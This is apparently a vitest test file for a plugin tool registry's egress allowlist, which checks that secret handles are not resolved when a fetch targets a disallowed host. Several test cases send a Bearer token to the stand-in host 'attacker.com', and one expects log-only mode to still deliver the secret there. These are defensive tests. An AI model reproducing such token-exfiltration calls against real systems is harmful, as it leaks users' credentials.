/**
 * PLA-723 — per-binding egress allowlist enforced at the dispatch chokepoint.
 *
 * The decision runs BEFORE substitution (EG5): a denied call aborts with the
 * worker never invoked and the handle never resolved to plaintext.
 */

import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { PaperclipPluginManifestV1 } from "@paperclipai/shared";
import type { PluginWorkerManager } from "../services/plugin-worker-manager.js";

const { createPluginToolRegistry } = await import("../services/plugin-tool-registry.js");
const { mintHandle, clearRunHandles } = await import("../handle-vault.js");
const { registerHostMediatedTool, clearHostMediatedTools } = await import("../handle-egress.js");

const PLUGIN_ID = "platform.http";
const PLUGIN_DB_ID = "plugin-db-http";
const RUN_ID = "run-allowlist-1";
const SECRET = "Zx7Qm2Lp9Rt4Wv6Yb1Nc3Df5Gh8Jk0Mn2Pq4Su6Xa";

// `fetch` is host-mediated with destination in the `url` param; `selfsend` is a
// plugin-self-egress tool (NOT registered host-mediated → deny-by-default, EG1).
const manifest = {
  tools: [
    { name: "fetch", displayName: "Fetch", description: "host fetch", parametersSchema: { type: "object" } },
    { name: "selfsend", displayName: "Self", description: "plugin egress", parametersSchema: { type: "object" } },
  ],
} as unknown as PaperclipPluginManifestV1;

const runContext = { agentId: "a", companyId: "co", runId: RUN_ID, projectId: "p" };

function buildRegistry(received: { params?: unknown }) {
  const workerManager = {
    isRunning: () => true,
    call: async (_d: string, _m: string, rpc: { parameters: unknown }) => {
      received.params = rpc.parameters;
      return { content: "ok" };
    },
  } as unknown as PluginWorkerManager;
  const registry = createPluginToolRegistry(workerManager);
  registry.registerPlugin(PLUGIN_ID, manifest, PLUGIN_DB_ID);
  return registry;
}

beforeEach(() => {
  clearHostMediatedTools();
  registerHostMediatedTool(`${PLUGIN_ID}:fetch`, { destinationParam: "url", kind: "url" });
});
afterEach(() => {
  clearRunHandles(RUN_ID);
  clearHostMediatedTools();
});

const enforced = (allowlist: string[]) => ({ allowedEgress: allowlist, enforced: true, bindingId: "b1" });

describe("egress allowlist at the chokepoint", () => {
  it("host-mediated + allowlisted destination → substitutes + dispatches", async () => {
    const handle = mintHandle(RUN_ID, SECRET, enforced(["https://api.github.com"]));
    const received: { params?: unknown } = {};
    const reg = buildRegistry(received);
    await reg.executeTool(
      `${PLUGIN_ID}:fetch`,
      { url: "https://api.github.com/repos", auth: `Bearer ${handle}` },
      runContext as never,
    );
    expect((received.params as { auth: string }).auth).toBe(`Bearer ${SECRET}`);
  });

  it("host-mediated + non-allowlisted destination → abort before resolve (worker never called)", async () => {
    const handle = mintHandle(RUN_ID, SECRET, enforced(["https://api.github.com"]));
    const received: { params?: unknown } = {};
    const reg = buildRegistry(received);
    await expect(
      reg.executeTool(
        `${PLUGIN_ID}:fetch`,
        { url: "https://attacker.com", auth: `Bearer ${handle}` },
        runContext as never,
      ),
    ).rejects.toThrow();
    expect(received.params).toBeUndefined();
  });

  it("EG5 — undeterminable destination (missing param) aborts before resolve", async () => {
    const handle = mintHandle(RUN_ID, SECRET, enforced(["https://api.github.com"]));
    const received: { params?: unknown } = {};
    const reg = buildRegistry(received);
    await expect(
      reg.executeTool(`${PLUGIN_ID}:fetch`, { auth: `Bearer ${handle}` }, runContext as never),
    ).rejects.toThrow();
    expect(received.params).toBeUndefined();
  });

  it("EG1 — non-host-mediated tool with an enforced handle denies by default", async () => {
    const handle = mintHandle(RUN_ID, SECRET, enforced(["https://api.github.com"]));
    const received: { params?: unknown } = {};
    const reg = buildRegistry(received);
    await expect(
      reg.executeTool(`${PLUGIN_ID}:selfsend`, { to: `Bearer ${handle}` }, runContext as never),
    ).rejects.toThrow();
    expect(received.params).toBeUndefined();
  });

  it("EG1 — per-binding opt-in lets a handle resolve in a non-host-mediated tool", async () => {
    const handle = mintHandle(RUN_ID, SECRET, {
      allowedEgress: [],
      enforced: true,
      bindingId: "b1",
      unmediatedOptInTools: [`${PLUGIN_ID}:selfsend`],
    });
    const received: { params?: unknown } = {};
    const reg = buildRegistry(received);
    await reg.executeTool(`${PLUGIN_ID}:selfsend`, { to: `${handle}` }, runContext as never);
    expect((received.params as { to: string }).to).toBe(SECRET);
  });

  it("EG5.3 — a second enforced handle excluding the destination aborts the whole call", async () => {
    const h1 = mintHandle(RUN_ID, SECRET, enforced(["https://api.github.com"]));
    const h2 = mintHandle(RUN_ID, "tok2", enforced(["https://gitlab.com"]));
    const received: { params?: unknown } = {};
    const reg = buildRegistry(received);
    await expect(
      reg.executeTool(
        `${PLUGIN_ID}:fetch`,
        { url: "https://api.github.com/x", a: `${h1}`, b: `${h2}` },
        runContext as never,
      ),
    ).rejects.toThrow();
    expect(received.params).toBeUndefined();
  });

  it("EG4 — log-only handle to a non-allowlisted destination still dispatches", async () => {
    const handle = mintHandle(RUN_ID, SECRET, {
      allowedEgress: ["https://api.github.com"],
      enforced: false,
      bindingId: "legacy",
    });
    const received: { params?: unknown } = {};
    const reg = buildRegistry(received);
    await reg.executeTool(
      `${PLUGIN_ID}:fetch`,
      { url: "https://attacker.com", auth: `Bearer ${handle}` },
      runContext as never,
    );
    expect((received.params as { auth: string }).auth).toBe(`Bearer ${SECRET}`);
  });
});
